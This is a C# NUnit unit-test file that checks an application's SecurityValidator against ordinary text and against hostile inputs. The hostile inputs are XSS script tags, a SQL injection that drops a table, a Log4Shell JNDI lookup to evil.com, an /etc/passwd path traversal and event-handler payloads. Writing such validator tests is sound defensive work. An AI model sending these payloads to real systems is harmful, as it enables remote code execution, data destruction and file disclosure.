using NUnit.Framework;
using Application.Common.Validators;

namespace Application.UnitTests.Common.Validators;

[TestFixture]
public class SecurityValidatorTests
{
    [Test]
    [TestCase("Normal text description")]
    [TestCase("Description with numbers 123")]
    [TestCase("Description with special chars: !@#$%^&*()")]
    [TestCase("Email: test@example.com")]
    [TestCase("URL: https://example.com")]
    public void IsSecure_ShouldReturnTrue_ForSafeInput(string safeInput)
    {
        // Act & Assert
        Assert.That(SecurityValidator.IsSecure(safeInput), Is.True);
    }

    [Test]
    [TestCase("<script>alert('xss')</script>")]
    [TestCase("'; DROP TABLE Projects; --")]
    [TestCase("${jndi:ldap://evil.com/a}")]
    [TestCase("../../etc/passwd")]
    [TestCase("%3Cscript%3E")]
    [TestCase("javascript:alert('xss')")]
    [TestCase("onclick=\"alert('xss')\"")]
    public void IsSecure_ShouldReturnFalse_ForMaliciousInput(string maliciousInput)
    {
        // Act & Assert
        Assert.That(SecurityValidator.IsSecure(maliciousInput), Is.False);
    }

    [Test]
    public void IsSecure_ShouldReturnTrue_ForNullOrEmptyInput()
    {
        // Act & Assert
        Assert.That(SecurityValidator.IsSecure(null), Is.True);
        Assert.That(SecurityValidator.IsSecure(""), Is.True);
        Assert.That(SecurityValidator.IsSecure("   "), Is.True);
    }

    [Test]
    [TestCase("Safe description")]
    [TestCase("Another safe input")]
    public void Validate_ShouldNotThrow_ForSafeInput(string safeInput)
    {
        // Act & Assert
        Assert.DoesNotThrow(() => SecurityValidator.Validate(safeInput, nameof(safeInput)));
    }

    [Test]
    [TestCase("<script>alert('xss')</script>")]
    [TestCase("'; DROP TABLE Projects; --")]
    public void Validate_ShouldThrowArgumentException_ForMaliciousInput(string maliciousInput)
    {
        // Act & Assert
        var exception = Assert.Throws<ArgumentException>(() => 
            SecurityValidator.Validate(maliciousInput, nameof(maliciousInput)));
        
        Assert.That(exception.Message, Does.Contain("invalid characters"));
        Assert.That(exception.ParamName, Is.EqualTo(nameof(maliciousInput)));
    }
}
